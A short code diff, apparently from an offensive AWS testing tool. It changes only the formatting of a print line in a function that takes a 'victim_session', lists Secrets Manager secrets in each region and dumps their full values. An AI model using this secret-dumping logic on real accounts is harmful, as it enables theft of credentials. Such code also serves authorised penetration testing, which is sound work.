@@ -14,7 +14,7 @@ def list_secrets_manager(victim_session):
             secrets_list = secrets_client.list_secrets().get("SecretList", [])
             for secret in secrets_list:
                 name = secret.get("Name")
-                print(f"{Fore.MAGENTA}\nRegion: {region} | Secret Name: {name}")
+                print(f"{Fore.MAGENTA}Region: {region} | Secret Name: {name}")
                 try:
                     secret_dump = secrets_client.get_secret_value(SecretId=name)
                     print(f"{Fore.YELLOW}{json.dumps(secret_dump, indent=4, sort_keys=True, default=custom_serializer)}")
